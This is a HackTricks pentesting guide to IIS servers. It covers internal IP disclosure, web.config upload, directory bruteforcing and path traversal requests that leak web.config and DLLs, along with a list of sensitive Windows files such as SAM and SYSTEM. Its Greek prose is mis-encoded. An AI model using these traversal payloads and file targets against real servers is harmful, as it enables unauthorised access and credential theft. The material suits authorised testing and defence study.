# IIS - Internet Information Services

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Î”Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼ÎµÏ‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½:

* asp
* aspx
* config
* php

## Î‘Ï€Î¿ÎºÎ¬Î»Ï…ÏˆÎ· ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ®Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ IP

Î£Îµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® IIS ÏŒÏ€Î¿Ï… Î»Î±Î¼Î²Î¬Î½ÎµÏ„Îµ 302, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± Host ÎºÎ±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ HTTP/1.0 ÎºÎ±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Î· ÎºÎµÏ†Î±Î»Î¯Î´Î± Location Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÏƒÎ±Ï‚ Î´ÎµÎ¯Î¾ÎµÎ¹ Ï„Î·Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Î‘Ï€Î¬Î½Ï„Î·ÏƒÎ· Ï€Î¿Ï… Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Ï„Î·Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Execute .config files

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± .config ÎºÎ±Î¹ Î½Î± Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ±. ÎˆÎ½Î±Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ ÎµÎ¯Î½Î±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± HTML ÏƒÏ‡ÏŒÎ»Î¹Î¿: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎºÎ±Î¹ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ [here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î· Î»Î¯ÏƒÏ„Î± Ï€Î¿Ï… Î­Ï‡Ï‰ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ ÏƒÏ…Î³Ï‡Ï‰Î½ÎµÏÎ¿Î½Ï„Î±Ï‚ Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Ï„Ï‰Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î»Î¹ÏƒÏ„ÏÎ½:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ ÎºÎ±Î¼Î¯Î± ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·, Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Ï„Î¿ Ï‡ÏÎµÎ¹Î¬Î¶Î¿Î½Ï„Î±Î¹ Ï„Î¿ Î­Ï‡Î¿Ï…Î½ Î®Î´Î·.

## Path Traversal

### Leaking source code

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï€Î»Î®ÏÎ· Î±Î½Î¬Î»Ï…ÏƒÎ· ÏƒÏ„Î¿: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Î©Ï‚ Ï€ÎµÏÎ¯Î»Î·ÏˆÎ·, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±ÏÎºÎµÏ„Î¬ Î±ÏÏ‡ÎµÎ¯Î± web.config Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Ï…Ï‚ Ï†Î±ÎºÎ­Î»Î¿Ï…Ï‚ Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ Î¼Îµ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚ ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î± "**assemblyIdentity**" ÎºÎ±Î¹ "**namespaces**". ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ **Ï€Î¿Ï Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ Ï„Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î±** ÎºÎ±Î¹ Î½Î± Ï„Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ.\
Î‘Ï€ÏŒ Ï„Î¹Ï‚ **ÎºÎ±Ï„ÎµÎ²Î±ÏƒÎ¼Î­Î½ÎµÏ‚ Dlls** ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **Î½Î­Î± namespaces** ÏŒÏ€Î¿Ï… Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎºÎ±Î¹ Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ web.config Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î½Î­Î± namespaces ÎºÎ±Î¹ assemblyIdentity.\
Î•Ï€Î¯ÏƒÎ·Ï‚, Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± **connectionstrings.config** ÎºÎ±Î¹ **global.asax** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.\\
{% endhint %}

Î£Ï„Î¹Ï‚ **.Net MVC ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚**, Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **web.config** Ï€Î±Î¯Î¶ÎµÎ¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ ÏÏŒÎ»Î¿ ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ ÎºÎ¬Î¸Îµ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€Î¿Ï… ÎµÎ¾Î±ÏÏ„Î¬Ï„Î±Î¹ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ XML ÎµÏ„Î¹ÎºÎµÏ„ÏÎ½ **"assemblyIdentity"**.

### **Exploring Binary Files**

ÎˆÎ½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **web.config** Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚, ÏŒÏ€Ï‰Ï‚:

* **EntityFramework** Î­ÎºÎ´Î¿ÏƒÎ·
* **AppSettings** Î³Î¹Î± Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚, Î­Î»ÎµÎ³Ï‡Î¿ Ï€ÎµÎ»Î±Ï„ÏÎ½ ÎºÎ±Î¹ JavaScript
* **System.web** ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ±Î¹ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·
* **System.webServer** ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î¼Î¿Î½Î¬Î´Ï‰Î½
* **Runtime** Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÎ¹Ï‚ assembly Î³Î¹Î± Ï€Î¿Î»Î»Î­Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÏŒÏ€Ï‰Ï‚ **Microsoft.Owin**, **Newtonsoft.Json**, ÎºÎ±Î¹ **System.Web.Mvc**

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Ï…Î½ ÏŒÏ„Î¹ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î±, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **/bin/WebGrease.dll**, Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /bin Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚.

### **Î‘ÏÏ‡ÎµÎ¯Î± Î¡Î¯Î¶Î±Ï‚ ÎšÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…**

Î‘ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ ÏÎ¯Î¶Î±Ï‚, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **/global.asax** ÎºÎ±Î¹ Ï„Î¿ **/connectionstrings.config** (Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚), ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± Î³Î¹Î± Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· ÎºÎ±Î¹ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚.

### **Namespaces ÎºÎ±Î¹ Web.Config**

ÎŸÎ¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ MVC Î¿ÏÎ¯Î¶Î¿Ï…Î½ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ **web.config Î±ÏÏ‡ÎµÎ¯Î±** Î³Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± namespaces ÏÏƒÏ„Îµ Î½Î± Î±Ï€Î¿Ï†ÎµÏÎ³Î¿Î½Ï„Î±Î¹ Î¿Î¹ ÎµÏ€Î±Î½Î±Î»Î±Î¼Î²Î±Î½ÏŒÎ¼ÎµÎ½ÎµÏ‚ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ ÏƒÎµ ÎºÎ¬Î¸Îµ Î±ÏÏ‡ÎµÎ¯Î¿, ÏŒÏ€Ï‰Ï‚ Î±Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ Î¼Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î³Î¹Î± Î»Î®ÏˆÎ· ÎµÎ½ÏŒÏ‚ Î¬Î»Î»Î¿Ï… **web.config**:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Î›Î®ÏˆÎ· DLLs**

Î— Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÎµ Î­Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ namespace Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ Î¼Î¹Î± DLL Î¼Îµ ÏŒÎ½Î¿Î¼Î± "**WebApplication1**" Ï€Î¿Ï… Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /bin. Î‘ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î³Î¹Î± Î»Î®ÏˆÎ· Ï„Î·Ï‚ **WebApplication1.dll**:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Î‘Ï…Ï„ÏŒ Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ Ï„Î·Î½ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î± Î¬Î»Î»Ï‰Î½ Î²Î±ÏƒÎ¹ÎºÏÎ½ DLL, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **System.Web.Mvc.dll** ÎºÎ±Î¹ Ï„Î¿ **System.Web.Optimization.dll**, ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /bin.

Î£Îµ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÏŒÏ€Î¿Ï… Î¼Î¹Î± DLL ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î­Î½Î± namespace Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **WebApplication1.Areas.Minded**, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¬Î½ÎµÎ¹ Ï„Î·Î½ ÏÏ€Î±ÏÎ¾Î· Î¬Î»Î»Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ web.config ÏƒÎµ Ï€ÏÎ¿Î²Î»Î­ÏˆÎ¹Î¼ÎµÏ‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚, ÏŒÏ€Ï‰Ï‚ **/area-name/Views/**, Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚ ÏƒÎµ Î¬Î»Î»ÎµÏ‚ DLL ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /bin. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Ï€ÏÎ¿Ï‚ Ï„Î¿ **/Minded/Views/web.config** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ namespaces Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Ï…Î½ Ï„Î·Î½ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î± Î¬Î»Î»Î·Ï‚ DLL, **WebApplication1.AdditionalFeatures.dll**.

### ÎšÎ¿Î¹Î½Î¬ Î±ÏÏ‡ÎµÎ¯Î±

Î‘Ï€ÏŒ [ÎµÎ´Ï](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

Î‘Î½ Î´ÎµÎ¯Ï„Îµ Î­Î½Î± ÏƒÏ†Î¬Î»Î¼Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ **Î´ÎµÎ½ Î­Î»Î±Î²Îµ Ï„Î¿ ÏƒÏ‰ÏƒÏ„ÏŒ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Î¼Î­Î±** Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± Host.\
Î“Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏÎ¯Î¾ÎµÏ„Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î¿ **SSL Certificate** Ï€Î¿Ï… ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„ÎµÎ¯Ï„Î±Î¹ ÎºÎ±Î¹ Î¯ÏƒÏ‰Ï‚ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Î¼Î­Î±/Ï…Ï€Î¿Ï„Î¿Î¼Î­Î± ÎµÎºÎµÎ¯. Î‘Î½ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎºÎµÎ¯, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **brute force VHosts** Î¼Î­Ï‡ÏÎ¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ ÏƒÏ‰ÏƒÏ„ÏŒ.

## Old IIS vulnerabilities worth looking for

### Microsoft IIS tilde character â€œ\~â€ Vulnerability/Feature â€“ Short File/Folder Name Disclosure

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± **enumerate folders and files** Î¼Î­ÏƒÎ± ÏƒÎµ ÎºÎ¬Î¸Îµ Î±Î½Î±ÎºÎ±Î»Ï…Ï†Î¸ÎµÎ¯ÏƒÎ± Ï†Î¬ÎºÎµÎ»Î¿ (Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Basic Authentication) Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ **Ï„ÎµÏ‡Î½Î¹ÎºÎ®**.\
